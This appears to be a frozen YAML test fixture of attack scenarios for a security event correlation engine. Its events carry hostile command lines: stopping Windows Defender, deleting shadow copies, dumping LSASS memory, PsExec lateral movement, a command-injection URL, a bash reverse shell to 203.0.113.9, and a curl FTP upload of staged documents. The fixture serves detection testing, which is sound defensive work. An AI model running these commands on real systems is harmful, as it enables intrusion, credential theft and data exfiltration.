# FROZEN campaigns v4. Do not edit (see validation/FROZEN.json).
scenarios:
- id: HC4-001
  name: Safe-mode ransomware prep after the AV service is stopped
  expect_correlation: TB-COR-006
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: srv-file-07
    process_name: net.exe
    command_line: net stop windefend
  - at: 25
    title: Process creation
    event_type: process.start
    asset_name: srv-file-07
    process_name: wmic.exe
    command_line: wmic shadowcopy delete
- id: HC4-002
  name: Credential dump then PsExec by the same account
  expect_correlation: TB-COR-004
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: ws-it-02
    process_name: procdump.exe
    command_line: procdump -ma lsass.exe l.dmp
    username: adm-kim
  - at: 60
    title: Process creation
    event_type: process.start
    asset_name: ws-it-02
    process_name: psexec.exe
    command_line: psexec \\10.0.4.22 -s cmd
    username: adm-kim
- id: HC4-003
  name: Web shell uploaded, then a reverse shell on the same server
  expect_correlation: TB-COR-003
  events:
  - at: 0
    title: HTTP request
    event_type: web.request
    source_ip: 198.51.100.171
    asset_name: web-15
    raw_data:
      url: /admin/ping.php?host=127.0.0.1;id|sh
  - at: 9
    title: Process creation
    event_type: process.start
    asset_name: web-15
    process_name: bash
    command_line: bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
- id: HC4-004
  name: Collect then stage then exfiltrate (archive and FTP upload)
  expect_correlation: TB-COR-005
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: ws-hr-02
    process_name: 7z.exe
    command_line: 7z.exe a -tzip C:\Users\Public\x.zip C:\Users\*\Documents\*.docx
  - at: 40
    title: Process creation
    event_type: process.start
    asset_name: ws-hr-02
    process_name: curl.exe
    command_line: curl.exe -T C:\Users\Public\x.zip ftp://203.0.113.20/ --user u:p
